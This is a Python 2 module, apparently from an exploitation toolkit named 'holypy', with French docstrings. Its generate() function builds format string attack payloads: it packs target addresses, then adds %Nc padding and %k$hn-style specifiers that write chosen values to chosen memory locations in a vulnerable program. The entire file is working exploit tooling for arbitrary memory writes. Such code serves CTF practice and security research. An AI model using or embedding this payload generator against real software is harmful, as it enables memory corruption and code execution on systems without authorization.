#!/usr/bin/python2
# coding: utf-8

# TODO: Handle Text (see previous version)
# TODO: Handle Offset
# TODO: Handle Invalid Charset
# TODO: Handle Clever Relocation
# TODO: Handle Multiple Address/Value

import holypy.utils.memory      as memory
from   holypy.utils.convert     import int_to_string, string_to_int, string_to_bytes
from   holypy.utils.iters       import split
from   holypy.utils.prettify    import perror

################################################################################
### Constants
################################################################################

SIZE      = {
    32: {"i": 4, "s": "I"},
    64: {"i": 8, "s": "Q"},
}
MODIFIERS = {
    1: "hh",
    2: "h",
    4: "",
    8: "l",
}

################################################################################
### Methods
################################################################################

def generate(address, value, index, bits = 32, size = 2, endian = True, raw = True):
    """
    Generation d'un payload format string
    """
    if not bits in SIZE.keys():
        perror("[-] Format: @bits must be either 32 or 64")
        return ""
    if not size in MODIFIERS.keys():
        perror("[-] Format: @size must be either 1, 2, 4 or 8")
        return ""
    if size > SIZE[bits]["i"]:
        perror("[-] Format: @size must be lower than @bits")
        return ""
    count   = 0
    chunks  = _split(address, value, bits, size, endian)
    payload = ""
    for i, chunk in enumerate(chunks):
        payload   += string_to_bytes(chunk["a"]) if not raw else chunk["a"]
        count     += SIZE[bits]["i"]
        chunk["i"] = i
    for i, chunk in enumerate(chunks):
        offset = string_to_int(chunk["v"]) - count
        if offset > 0:
            payload += "%%%dc" % offset
        elif offset < 0:
            perror("[-] Format: invalid offset")
            return
        payload += "%%%d$%sn" % (index + chunk["i"], MODIFIERS[size])
        count   += offset
    return payload

def _split(address, value, bits, size, endian):
    """
    Creation des differentes partie du payload
    """
    parts = []
    value = _format(value, bits, endian)
    for i, v in enumerate(split(value, size)):
        parts.append({
            "a": _format(address + i * size, bits, endian),
            "v": v[::-1] if endian else v,
            "i": -1,
        })
    return sorted(parts, key = lambda x: x["v"])

def _format(value, bits, endian):
    """
    Formate @value pour etre ecrit en memoire
    """
    value = memory.endian(value, SIZE[bits]["s"]) if endian else value
    return int_to_string(value).rjust(SIZE[bits]["i"], "\x00")
